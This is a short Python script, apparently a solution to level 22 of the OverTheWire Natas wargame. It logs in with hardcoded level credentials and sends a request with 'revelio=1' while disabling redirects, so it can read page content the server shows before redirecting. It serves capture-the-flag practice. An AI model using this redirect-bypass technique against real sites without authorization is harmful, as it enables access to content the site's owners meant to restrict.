import requests

URL = "http://natas22.natas.labs.overthewire.org/?revelio=1" 
CREDS = ("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ")

print(requests.get(URL, auth=CREDS, allow_redirects=False).text) 
